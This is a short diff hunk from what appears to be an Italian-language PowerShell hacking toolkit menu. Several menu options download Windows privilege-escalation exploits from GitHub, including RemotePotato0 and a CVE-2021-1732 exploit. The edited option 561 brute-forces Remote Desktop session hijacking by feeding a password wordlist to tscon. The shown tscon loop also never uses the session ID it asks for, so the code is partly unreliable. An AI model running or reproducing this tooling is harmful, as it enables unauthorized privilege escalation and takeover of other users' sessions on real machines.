@@ -960,7 +960,7 @@ while($true){
         '558' {ScaricaRel "antonioCoco/RemotePotato0"}
         '559' {ScaricaRel "wdelmas/remote-potato"}
         '560' {ScaricaSSL "exploitblizzard/Windows-Privilege-Escalation-CVE-2021-1732" "Windows-Privilege-Escalation-CVE-2021-1732.zip" "exploitblizzard/Windows-Privilege-Escalation-CVE-2021-1732/archive/refs/heads/main.zip"}
-        '561' {if(Test-Path tscon){if(Test-Path query){query user; $TSID=read-host "Digit a session ID"; if($TSID -ne ""){foreach($TENT in get-content $FILE){tscon /password:$TENT}}}}}
+        '561' {if(Test-Path "C:\\Windows\\System32\\tscon.exe"){if(Test-Path "C:\\Windows\\System32\\query.exe"){query user; $TSID=read-host "Digit a session ID"; if($TSID -ne ""){foreach($TENT in get-content $FILE){tscon /password:$TENT}}}}}
         default{write-host 'ERROR: this choice is incorrect'}
     }
     read-host "Press ENTER to continue";
